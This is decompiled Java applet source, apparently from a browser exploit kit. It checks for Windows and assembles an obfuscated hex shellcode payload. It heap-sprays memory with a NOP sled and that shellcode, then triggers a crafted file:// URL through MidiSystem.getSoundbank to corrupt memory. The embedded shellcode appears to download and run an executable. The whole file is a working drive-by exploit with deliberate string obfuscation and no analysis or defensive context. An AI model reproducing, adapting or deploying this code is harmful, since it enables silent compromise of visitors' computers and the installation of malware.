import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Ifology extends Applet
{
    private IntBuffer[] mem;
    
    @Override
    public void init() {
        repeat('/', 303);
        if (System.getProperty("UosUU.naUme".replace("U", "")).toLowerCase().indexOf("wieeeneee".replace("e", "")) < 0) {
            return;
        }
        final String string = "fileW:/WWWW/".replace("W", "") + repeat('/', 302) + "Z%ZPPP%Z%ZPPPP%PPZPPPPPP%PPPPZ%".replace("P", "");
        final String string2 = "oooo5oo0oo535ooooo15oooo256ooooo5o7559ooooooooCE8oooooo00ooo0o0oo00oo0oooooo05D83ED0ooooD31oooC064o034030ooo78oooooooo0ooooCoooooo8Booo40oooo0C8Booo70oooo1CooooAoD8B4oooooo0ooo08EooooBooo0ooo98Boo40348D40ooo7C8ooB40ooo3C5oooo6".replace("o", "") + "mm57mmmmBE5Em01m0000mmm0mmmm1EEmmmBF4mmmE0mmm1mmm000m0mmm01EmmmmFEmmmmmm8D60100mmmm005mmF5Emm8mmm9mEAmmm8m1C2mm5E0m100m005mmmm2mmmmm688mmm0mmm0mmmm00mmmm0mmmm00FFmm9mmmm5mmmm4mE010mmm00mmmm0m8mmm9EA81mmmmCmmm25mmEmm0".replace("m", "") + "1LLL00LL0LLLL0L3LL1FL601C2LLLLLL8A9LCLLLL35LLLLLL63LLLL020LLLL00L0LLLL80LLLFLLLB0L0LLLL74L0688L1C32LLLL46EBLEEC60432LLLL008LLL9ELA8LL1CLLLLLL2LLLL450LLL200LL0LLL052FFLLL95L5LLLLLL2L01LL0LL0LLL00LLL89EA8LL1LLLLC2LL".replace("L", "") + "N500NNNN2NNNN00NNNN005N2NN5N0NNFF9NN5560NNNN10NN0006NNNA0NNNN06A0089NNNENANNNNN81CNNN2NNNN5NNE01NNN0NN0N0NNN0NN52NNN89NNENNNA81CNNN2NN7NNNN8NNN02NNNN0000NN526NNNANNN0NNNN0NNNNNNNNFFDN0NNNN6AN0NNNN5NNNNN8NNN9NNENANN81C25NNNNE01NNN00NN0NN".replace("N", "") + "0s52ssssFF9ssss55As0s1sss00sss0s089sssssEA81Csss25sssssE010s000sss52ssss6ss8800ssss0ssss000sss0sFFss95ssss4Essssss01sss0sss0s00sss8s9EA8ss1ssC25Essss01s000031ssFsss6sss01Cs28Asss9C35ss6E02s00ss0sss080ssss".replace("s", "") + "FTTTTTTB0TT0TTTTTTT74TTTTT0TT6TTTT881C3T24TTT6TTTTETBTTTTEEC6TTTT0TTTT43TTT200TTTT89ETA8TT1TTTCTTTT24502TTTT000TT0TTT52FTFT95TTTT52TTT0100TTTT008TTTT9TTEAT81CT2TTT5TT00T2TT00TTT0TTTT0525T0TTTFTTTTF9T55T60TT1TTTT0000TTTT6ATTTT0TT0T6".replace("T", "") + "A0089OEOOOAOOOOOOOO8OO1OOOOCOOOO2OOOOOOO5OOEOOOO0100OOOOOO005OOO289OOOEOOOOA81OCOOO2OOOOAOO6OOOOO020O000OO5OOOOOO2O6A00FOOFOOOD06OOOAOOO058OOO9OOOEAOO81OOCOOOOO2OOO5OOOEO010O0OOOO00OO52OOOOFFOOOOOO955AOOO01OO0OOOO0OO0OOOO09D5D5OF5E5A5OOOO95BOOOO".replace("O", "") + "jjjj5jjjjj8Cj30jjjj0j00j0000000jj0jjjjjjj0jj0j0jjjj0jjjj00jj0jj00000jjjj0j00j0jjjj00004jjjj7657jjjj4jjjj5465jj6D7jjjj0jj5j0jjjjjjjj61jjj74jj6jj84j1jjjj00jjj4jjCjjj6F61j6jj4jjjj4jjjCjj6j9jjjj62j7j2jjj61jj72794j1jjjjjjj0j0j4765jj7jjjj45j".replace("j", "") + "iiii072i6iiiiF6ii3416i46472ii65iii737iii3iii00iiii5iii76ii9ii6E4iiiii578iiiiii65ii630iii0iBB89iF2iiii8iiiii9iiF7ii30C0iAE75FD29Fi78i9Fiiii9ii31C0iiiiBiE3iiiiCiiii00i0i000iiiiiiii0iiiiii3iiiiBii5ii1Bi0ii2ii000iii0iii66iiii".replace("i", "") + "ApppDp0p3851ppBpppp0ppp2ppp0pppp0008Bppp70pp78pppp8pppp3ppppCp6pppp1pppC03Bp5ppppppp1ppB020pppp0pppp00pp8DBppppDppp1pppF0pp20p000pppADpppp03pppp85pp1Bpppp0pppp200ppp00ApBppppADpp0p3pppppp851B02pp0ppp000pppp50ABAD0pppp38pppp5pp1pB02ppp0".replace("p", "") + "g000ggggggggAggB5E31DggggBggAD56gg0385gggg1Bgggg020gg0ggg00gggg89gggCggg68g9ggD751gFCggggFgggg3gggAggg659740ggg4gg5E43gggEBgggEgggg95E9ggg3ggggggD1E0038ggggg52702000ggg03gg1Fgggg696ggg6g6ADgggggC1Egggg0ggg0gg203gggg".replace("g", "") + "eeee8e51eFeeee0eeeee2eeeeee0eeee00eeee089C6AeeDee0ee3eeee8eeeeee5eee1eeeBeeeeee0eee2e0ee0e0eeee0eeeC3EBee1eee0000ee000eee0eee0ee0000eee00eeee00000e0000e0eee00e0000ee008ee9eee8e5eee1eeeeB0eeeeeee2000eeee0eeee5657eeeEee858FFeeeeFFeeeFeeeeF5eeFee5e".replace("e", "") + "E:::A:B:0::1:::CE80::::3EBB7:402E::::BE:::DC3:::::::5:::5524C4:D4F:4:::E::::2:E44::4:C:::::::4:C::0::05:::5:::5::::::24::C::::446F::::77:::6:::E6C6F6::::1:::6:::4546::::F::46696::::C:::65::4:::100706:::46:::6757::::06::::42E6::::5:7:86:::500:::6:::37::2::61736:82E::::70::6:::8::70:::00::::".replace(":", "");
        try {
            final String string3 = "" + string2 + Brealizer.decodeString(this.getParameter("smitmmmmmmmmemmm".replace("m", ""))) + "ooo0090oooo".replace("o", "");
            final URL url = new URL(string);
            this.mem = this.__v(string3, "90UUUUU909U0U9UUU0".replace("U", ""));
            MidiSystem.getSoundbank(url);
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {}
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] __v(final String s, final String s2) {
        return this.__v(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] __v(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
